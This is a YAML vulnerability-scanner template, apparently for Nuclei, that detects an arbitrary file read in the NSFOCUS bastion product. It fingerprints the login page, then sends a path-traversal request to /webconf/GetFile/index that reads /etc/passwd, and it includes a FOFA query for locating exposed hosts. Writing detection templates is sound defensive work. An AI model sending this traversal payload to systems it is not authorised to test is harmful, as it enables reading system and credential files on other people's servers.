flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(tolower(body), 'nsfocus')
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET /user/requireLogin HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - regex('root:.*:0:0:', body)
    - status_code == 200
    type: dsl
  raw:
  - 'GET /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
id: nsfocus-lfi
info:
  author: ritikchaddha
  description: 'Nsfocus bastion has an Arbitrary File Read Vulnerability through ''/webconf/GetFile/''.

    '
  metadata:
    fofa-query: body="'/needUsbkey.php?username='"
    max-request: 2
    verified: true
  name: Nsfocus - Arbitrary File Read
  reference:
  - https://forum.butian.net/article/250
  severity: high
  tags: nsfocus,lfi
